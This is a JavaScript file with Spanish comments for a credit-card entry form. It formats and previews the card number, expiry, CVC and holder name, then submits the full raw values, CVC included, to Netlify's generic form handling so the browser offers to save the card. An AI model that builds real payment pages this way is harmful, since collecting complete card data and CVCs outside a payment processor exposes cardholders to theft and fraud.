document.addEventListener('DOMContentLoaded', () => {
  // === CONFIG ===
  // false => recomendado para que el navegador ofrezca guardar (submit real)
  // true  => demo (evita enviar; puede que NO salga el popup)
  const DEMO_MODE = false;

  // Si quieres redirigir a una página "gracias" en Netlify:
  // crea /gracias.html y pon:
  // const THANK_YOU_URL = "/gracias.html";
  const THANK_YOU_URL = ""; // "" = no tocar, Netlify maneja según tu setup

  // === ELEMENTOS ===
  const form = document.getElementById('payment-form');

  const cardNumberEl = document.getElementById('card-number');
  const monthEl = document.getElementById('expiry-month');
  const yearEl = document.getElementById('expiry-year');
  const cvcEl = document.getElementById('cvc');
  const nameEl = document.getElementById('cardholder-name');

  const numberPreview = document.getElementById('card-number-preview');
  const expiryPreview = document.getElementById('card-expiry-preview');
  const cvcPreview = document.getElementById('card-cvc-preview');
  const namePreview = document.getElementById('card-name-preview'); // opcional

  const successMessage = document.getElementById('success-message');
  const errorMessage = document.getElementById('error-message');

  // === HELPERS ===
  const onlyDigits = (s) => (s || '').replace(/\D/g, '');

  function showMessage(type, message) {
    if (successMessage) successMessage.style.display = 'none';
    if (errorMessage) errorMessage.style.display = 'none';

    if (type === 'success') {
      if (successMessage) {
        successMessage.textContent = message;
        successMessage.style.display = 'block';
      }
    } else {
      if (errorMessage) {
        errorMessage.textContent = message;
        errorMessage.style.display = 'block';
      }
    }

    setTimeout(() => {
      if (successMessage) successMessage.style.display = 'none';
      if (errorMessage) errorMessage.style.display = 'none';
    }, 4500);
  }

  function updateExpiryPreview() {
    const m = monthEl.value;
    const y = yearEl.value;
    if (expiryPreview) expiryPreview.textContent = (m && y) ? `${m}/${y}` : 'MM/AA';
  }

  // === INPUT HANDLERS (formateo + preview) ===
  cardNumberEl.addEventListener('input', (e) => {
    // solo números, máximo 19 dígitos (por compatibilidad general)
    let digits = onlyDigits(e.target.value).slice(0, 19);
    // agrupar 4-4-4-4...
    const formatted = digits.match(/.{1,4}/g)?.join(' ') || digits;
    e.target.value = formatted;

    if (numberPreview) numberPreview.textContent = formatted || '•••• •••• •••• ••••';
  });

  nameEl.addEventListener('input', (e) => {
    const v = e.target.value.trim();
    if (namePreview) namePreview.textContent = v ? v.toUpperCase() : 'NOMBRE APELLIDO';
  });

  monthEl.addEventListener('input', (e) => {
    e.target.value = onlyDigits(e.target.value).slice(0, 2);
    updateExpiryPreview();
  });

  yearEl.addEventListener('input', (e) => {
    e.target.value = onlyDigits(e.target.value).slice(0, 2);
    updateExpiryPreview();
  });

  cvcEl.addEventListener('input', (e) => {
    const v = onlyDigits(e.target.value).slice(0, 4);
    e.target.value = v;
    if (cvcPreview) cvcPreview.textContent = v ? '•'.repeat(v.length) : '•••';
  });

  // === SUBMIT ===
  // IMPORTANTE: para que el popup salga con más probabilidad,
  // NO uses preventDefault (excepto si hay errores).
  form.addEventListener('submit', (e) => {
    const rawNumber = onlyDigits(cardNumberEl.value);
    const mm = monthEl.value;
    const yy = yearEl.value;
    const holder = nameEl.value.trim();

    // Validación mínima: si falla, sí bloqueamos el submit.
    if (rawNumber.length < 13) {
      e.preventDefault();
      showMessage('error', 'Número de tarjeta inválido.');
      return;
    }

    const monthNum = parseInt(mm, 10);
    if (!mm || mm.length !== 2 || Number.isNaN(monthNum) || monthNum < 1 || monthNum > 12) {
      e.preventDefault();
      showMessage('error', 'Mes inválido (01–12).');
      return;
    }

    const yearNum = parseInt(yy, 10);
    if (!yy || yy.length !== 2 || Number.isNaN(yearNum)) {
      e.preventDefault();
      showMessage('error', 'Año inválido (AA).');
      return;
    }

    if (!holder) {
      e.preventDefault();
      showMessage('error', 'Nombre del titular requerido.');
      return;
    }

    // Modo demo: bloquea el envío (el popup puede no aparecer).
    if (DEMO_MODE) {
      e.preventDefault();
      showMessage('success', 'Demo OK (sin enviar). Nota: el popup suele salir mejor con submit real.');
      return;
    }

    // Modo recomendado: dejar submit real a Netlify.
    // No resetees el form aquí, no borres valores, no redibujes; deja al navegador terminar.
    showMessage('success', 'Enviando…');

    // Opcional: redirección manual a una página de gracias (si quieres controlar UX).
    // OJO: si rediriges MUY rápido, a veces puede afectar el prompt.
    // Por eso lo dejo desactivado por defecto.
    if (THANK_YOU_URL) {
      // Pequeña demora para no cortar el flujo del navegador
      setTimeout(() => {
        window.location.href = THANK_YOU_URL;
      }, 800);
    }
  });
});
